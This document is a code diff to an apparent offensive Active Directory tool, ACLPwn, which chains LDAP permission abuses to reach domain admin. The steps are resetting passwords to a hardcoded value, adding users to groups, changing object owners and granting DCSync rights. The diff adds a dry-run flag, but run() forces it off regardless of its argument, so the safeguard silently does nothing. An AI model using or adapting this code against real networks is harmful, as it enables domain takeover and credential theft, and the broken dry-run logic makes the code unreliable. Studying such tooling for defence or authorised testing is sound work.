@@ -11,6 +11,7 @@ import pprint
 
 import aiohttp
 from msldap.commons.url import MSLDAPURLDecoder
+from msldap.commons.exceptions import LDAPModifyException
 from aiosmb.commons.connection.url import SMBConnectionURL
 
 
@@ -26,6 +27,7 @@ class ACLPwn:
 		self.newpass = 'Passw0rd!1'
 		self.objcache = {}
 		self.current_user = None
+		self.dry_run = True
 
 		self.is_graph_loaded = False
 
@@ -146,11 +148,20 @@ class ACLPwn:
 			if sid not in self.objcache:
 				#http://127.0.0.1:5000/group/1/by_sid/S-1-5-21-4136613964-2812260436-2179565534-2643
 				async with aiohttp.ClientSession() as session:
-					async with session.get('%s/%s/%s/by_sid/%s' % (self.jd_url, stype, self.graph_id, sid)) as resp:
-						if resp.status != 200:
-							raise Exception('Loading graphid failed! Status: %s' % resp.status)
-						body = await resp.text()
-						self.objcache[sid] = json.loads(body)
+					if stype == 'domain':
+						async with session.get('%s/%s/by_sid/%s' % (self.jd_url, stype, sid)) as resp:
+							if resp.status != 200:
+								raise Exception('Loading graphid failed! Status: %s' % resp.status)
+							
+							body = await resp.text()
+							self.objcache[sid] = json.loads(body)
+					else:
+						async with session.get('%s/%s/%s/by_sid/%s' % (self.jd_url, stype, self.graph_id, sid)) as resp:
+							if resp.status != 200:
+								raise Exception('Loading graphid failed! Status: %s' % resp.status)
+					
+							body = await resp.text()
+							self.objcache[sid] = json.loads(body)
 			
 			return self.objcache[sid], None
 		except Exception as e:
@@ -167,6 +178,8 @@ class ACLPwn:
 			if 'distinguishedName' in userinfo:
 				return userinfo['distinguishedName'], None
 
+			else:
+				print(userinfo)
 		except Exception as e:
 			return False, e
 
@@ -191,6 +204,10 @@ class ACLPwn:
 
 			ldapclient = self.get_ldap().get_client()
 			print('Changing user %s \'s password to %s' % (user_dn, self.newpass))
+			if self.dry_run is True:
+				print('Changing user %s \'s password to %s' % (user_dn, self.newpass))
+				return True, None
+
 			_, err = await ldapclient.connect()
 			if err is not None:
 				raise err
@@ -200,7 +217,7 @@ class ACLPwn:
 				raise err
 			
 			print('User password changed!')
-
+			return True, None
 		except Exception as e:
 			print('Failed to change password for user %s' % user_dn)
 			return False, e
@@ -216,6 +233,10 @@ class ACLPwn:
 			if err is not None:
 				raise err
 
+			if self.dry_run is True:
+				print('Adding addmember privs to user %s \'s on group %s' % (user_dn, group_dn))
+				return True, None
+
 			ldapclient = self.get_ldap().get_client()
 			print('Adding addmember privs to user %s \'s on group %s' % (user_dn, group_dn))
 			_, err = await ldapclient.connect()
@@ -227,6 +248,7 @@ class ACLPwn:
 				raise err
 			
 			print('User granted addmember privileges!')
+			return True, None
 
 		except Exception as e:
 			print('Failed to add addmember privilege to %s' % group_dn)
@@ -243,6 +265,10 @@ class ACLPwn:
 			if err is not None:
 				raise err
 
+			if self.dry_run is True:
+				print('Adding user %s \'s to group %s' % (user_dn, group_dn))
+				return True, None
+
 			ldapclient = self.get_ldap().get_client()
 			print('Adding user %s \'s to group %s' % (user_dn, group_dn))
 			_, err = await ldapclient.connect()
@@ -251,9 +277,13 @@ class ACLPwn:
 			
 			_, err = await ldapclient.add_user_to_group(user_dn, group_dn)
 			if err is not None:
-				raise err
+				if not (isinstance(err, LDAPModifyException) and err.resultcode == 68):
+					print(err.resultcode)
+					print(type(err.resultcode))
+					raise err
 			
-			print('User password changed!')
+			print('User added to the group!')
+			return True, None
 
 		except Exception as e:
 			print('Failed to add user %s to group %s' % (user_dn, group_dn))
@@ -270,6 +300,10 @@ class ACLPwn:
 			if err is not None:
 				raise err
 
+			if self.dry_run is True:
+				print('Changing Owner of %s (%s) to %s' % (group_dn, dst_type, user_dn))
+				return True, None
+
 			ldapclient = self.get_ldap().get_client()
 			print('Changing Owner of %s (%s) to %s' % (group_dn, dst_type, user_dn))
 			_, err = await ldapclient.connect()
@@ -282,6 +316,10 @@ class ACLPwn:
 			
 			print('Object owner changed!')
 
+			
+
+
+			return True, None
 		except Exception as e:
 			print('Failed to change ownership of object %s (%s) to user %s' % (group_dn, dst_type ,user_dn))
 			return False, e
@@ -297,17 +335,22 @@ class ACLPwn:
 			if err is not None:
 				raise err
 
+			if self.dry_run is True:
+				print('Adding DcSync rights to user %s' % user_dn)
+				return True, None
+
 			ldapclient = self.get_ldap().get_client()
 			print('Adding DcSync rights to user %s' % user_dn)
 			_, err = await ldapclient.connect()
 			if err is not None:
 				raise err
 			
-			_, err = await ldapclient.add_priv_dcsync(self, user_dn, forest_dn)
+			_, err = await ldapclient.add_priv_dcsync(user_dn, forest_dn)
 			if err is not None:
 				raise err
 			
 			print('User got DcSync rights!')
+			return True, None
 
 		except Exception as e:
 			print('Failed to add DcSync rights to user %s' % user_dn)
@@ -327,7 +370,7 @@ class ACLPwn:
 				print(path)
 				i = 0
 				link = []
-				while i < len(path):
+				while i < len(path)-1:
 					if path[i+1] != 'member':
 						link.append((path[i], path[i+1], path[i+2]))
 						print((path[i], path[i+1], path[i+2]))
@@ -416,22 +459,32 @@ class ACLPwn:
 			if selected_actions is None:
 				raise Exception('No action found which would yield domain admin rights.')
 			
-			for action in actions:
-				_, err = await action
+
+			err = None
+			action_to_cancel = []
+			for i, action in enumerate(actions):
 				if err is not None:
-					raise err
+					action_to_cancel.append(action)
+					continue
+				_, err = await action
 			
+			print(action_to_cancel)
+			#for action in action_to_cancel:
+			#	action.cancel()
+			
+			if err is not None:
+				raise err
+				
+
 			print('Actions succeeded we should be DA now!')
-
-
-
 			
 			return True, None
 		except Exception as e:
 			return False, e
 
-	async def run(self):
+	async def run(self, dry_run = True):
 		try:
+			self.dry_run = False
 			if self.is_graph_loaded is False:
 				_, err = await self.load_graph()
 				if err is not None:
